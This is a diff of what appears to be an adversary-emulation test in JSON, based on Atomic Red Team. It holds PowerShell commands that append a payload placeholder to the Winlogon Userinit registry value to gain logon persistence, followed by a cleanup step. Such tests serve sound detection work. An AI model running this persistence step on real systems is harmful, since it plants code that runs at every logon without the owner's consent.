@@ -7,39 +7,39 @@
   ],
   "steps": [
     {
-      "id": "509c310b-928e-4707-b19f-3366c41c2be4",
+      "id": "0540d112-a151-49d2-8f0b-e1f25c2a1da0",
       "type": "execute-command",
       "data": {
         "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \" #{payload}\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$newvalue\"\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "37227167-7709-4a3b-a100-82a9bcc65ce1",
+      "id": "46401237-cc63-4e6c-a6ec-43205d7a253d",
       "type": "execute-command",
       "data": {
         "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup');\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup'",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "509c310b-928e-4707-b19f-3366c41c2be4",
+      "s": "0540d112-a151-49d2-8f0b-e1f25c2a1da0",
       "p": "on-success",
-      "o": "37227167-7709-4a3b-a100-82a9bcc65ce1"
+      "o": "46401237-cc63-4e6c-a6ec-43205d7a253d"
     },
     {
-      "s": "509c310b-928e-4707-b19f-3366c41c2be4",
+      "s": "0540d112-a151-49d2-8f0b-e1f25c2a1da0",
       "p": "on-failure",
-      "o": "37227167-7709-4a3b-a100-82a9bcc65ce1"
+      "o": "46401237-cc63-4e6c-a6ec-43205d7a253d"
     }
   ],
   "tags": [
-    "T1547.001",
-    "atomic-red-team"
+    "T1547",
+    "T1547.001"
   ],
   "input_arguments": [
     {
